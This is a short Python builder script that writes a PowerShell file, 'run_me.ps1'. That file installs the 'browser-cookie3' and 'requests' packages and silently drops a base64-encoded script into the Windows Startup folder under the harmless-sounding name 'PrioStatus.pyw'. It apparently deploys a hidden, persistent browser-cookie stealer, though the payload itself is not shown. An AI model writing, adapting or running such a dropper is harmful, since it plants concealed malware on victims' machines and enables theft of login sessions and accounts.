import base64

with open('startup.py', 'r') as f:
    script = f.read().replace('\r\n', '\n').replace('\n','\r\n')

script = base64.b64encode(script.encode('utf-8')).decode('utf-8')

command2 = f'''[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('{script}')) | Out-File -Encoding utf8 "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\PrioStatus.pyw"'''

commands = [
    'pip install --upgrade requests',
    'pip install --upgrade browser-cookie3',
    command2
]

with open('run_me.ps1','w') as f:
    f.write('\r\n'.join(commands) + '\r\n')

